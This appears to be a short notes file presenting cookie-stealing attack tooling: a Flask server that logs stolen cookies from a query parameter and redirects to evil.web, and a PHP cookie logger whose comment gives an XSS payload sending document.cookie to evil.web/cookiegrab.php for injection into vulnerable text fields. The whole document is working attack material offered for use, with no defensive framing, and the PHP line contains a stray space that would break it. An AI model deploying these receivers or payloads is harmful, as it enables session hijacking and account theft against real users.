## FLASK
> Its my favorite. Light and flexible

Requirements:
- sudo apt-get install python-virtualenv 
- sudo apt-get install python-pip
- virtualenv --version
- pip install Flask

```
from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__) # create the instance

@app.route('/') # directorio home
def cookie():

        #cookie = str(request.args.get('c'))
        f = open("dirty_data.txt",'a')
        kaka = (str(request.args.get('c')) + ' ' + str(datetime.now()) + '\n')
        f.write(kaka)
        f.close()

        return redirect("http://evil.web/n0thing_t0_d0_here.txt") #simple redirection

if __name__ == "__main__":
        app.run(host = '0.0.0.0', port=4444) # default host = '0.0.0.0', port=5000
        
```

## PHP

```
<?php
	$cookie = $_GET[" c"];
	$file = fopen('cookielog.txt', 'a');
	fwrite($file, $cookie . "\n\n");
	/* 
	inject 
	<script language="javascript"> document.location= " http://evil.web/cookiegrab.php?c=" + document.cookie; </script>
	into vulnerable text fields
	*/
?> 
```
